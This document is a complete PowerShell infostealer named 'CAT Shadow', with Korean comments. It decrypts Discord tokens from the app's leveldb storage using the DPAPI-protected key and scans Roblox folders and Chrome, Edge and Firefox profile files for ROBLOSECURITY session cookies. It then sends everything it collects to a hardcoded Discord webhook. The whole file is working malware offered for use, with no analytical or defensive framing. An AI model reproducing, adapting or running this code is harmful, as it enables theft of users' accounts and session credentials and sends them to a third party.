# ==============================================
# CAT Shadow - Discord Token + Roblox Session Stealer
# Requires: PowerShell 7 (pwsh)
# ==============================================
$w='https://discord.com/api/webhooks/1538403770965426247/cKkhSXToyltnfneUV1D1q8kV1Y3KpH_iUXK8rgozjvNOtKQjXWxBj-l9EZDLdmPI-AEL';

# ---------- 디스코드 토큰 ----------
$t=@();
$paths=@("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb");
foreach($p in $paths){
    $ls=Join-Path $p 'Local State';
    $ldb=Join-Path $p 'Local Storage\leveldb';
    if(Test-Path $ls){
        $s=Get-Content $ls -Raw|ConvertFrom-Json;
        $encKey=[Convert]::FromBase64String($s.os_crypt.encrypted_key);
        $protectedKey=$encKey[5..($encKey.Length-1)];
        $key=[System.Security.Cryptography.ProtectedData]::Unprotect($protectedKey,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);
        if(Test-Path $ldb){
            Get-ChildItem $ldb -Filter *.ldb|%{
                $c=Get-Content $_.FullName -Raw;
                $m=[regex]::Matches($c,'dQw4w9WgXcQ:[^\s]+');
                foreach($x in $m){
                    $e=$x.Value.Replace('dQw4w9WgXcQ:','');
                    try{
                        $eb=[Convert]::FromBase64String($e);
                        $nonce=$eb[3..14];
                        $ct=$eb[15..($eb.Length-16)];
                        $tag=$eb[($eb.Length-16)..($eb.Length-1)];
                        $aes=[System.Security.Cryptography.AesGcm]::new($key);
                        $pt=New-Object byte[] $ct.Length;
                        $aes.Decrypt($nonce,$ct,$tag,$pt);
                        $d=[System.Text.Encoding]::UTF8.GetString($pt);
                        if($d -match '^[A-Za-z0-9\.\-_]{24,}\.[A-Za-z0-9\.\-_]{6,}\.[A-Za-z0-9\.\-_]{27,}$'){
                            $t+=$d
                        }
                    }catch{}
                }
            }
        }
    }
}

# ---------- Roblox 세션 ----------
$rbx=@();
$robPaths=@("$env:LOCALAPPDATA\Roblox","$env:APPDATA\Roblox");
foreach($rp in $robPaths){
    if(Test-Path $rp){
        Get-ChildItem $rp -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;
            if($content -match 'ROBLOSECURITY'){
                $lines = $content -split "`n";
                foreach($line in $lines){
                    if($line -match 'ROBLOSECURITY'){
                        $rbx += "$($_.FullName): $line";
                    }
                }
            }
        }
    }
}
# 브라우저 쿠키에서 검색
$browserRoots=@("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:APPDATA\Mozilla\Firefox\Profiles");
foreach($br in $browserRoots){
    if(Test-Path $br){
        Get-ChildItem $br -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            if($_.Length -lt 10MB){
                $bytes=[System.IO.File]::ReadAllBytes($_.FullName);
                $text=[System.Text.Encoding]::UTF8.GetString($bytes);
                if($text -match 'ROBLOSECURITY'){
                    $idx=$text.IndexOf('ROBLOSECURITY');
                    $start=[Math]::Max(0,$idx-100);
                    $len=[Math]::Min(500,$text.Length-$start);
                    $context=$text.Substring($start,$len);
                    $rbx += "$($_.FullName): $context";
                }
            }
        }
    }
}

# ---------- 웹훅 전송 ----------
$dt = if($t.Count){$t -join ','}else{'none'};
$rb = if($rbx.Count){$rbx -join ' | '}else{'none'};
$msg = "Discord Tokens: $dt`nRoblox Session: $rb";
$payload=@{content=$msg}|ConvertTo-Json;
Invoke-RestMethod -Uri $w -Method Post -ContentType 'application/json' -Body $payload
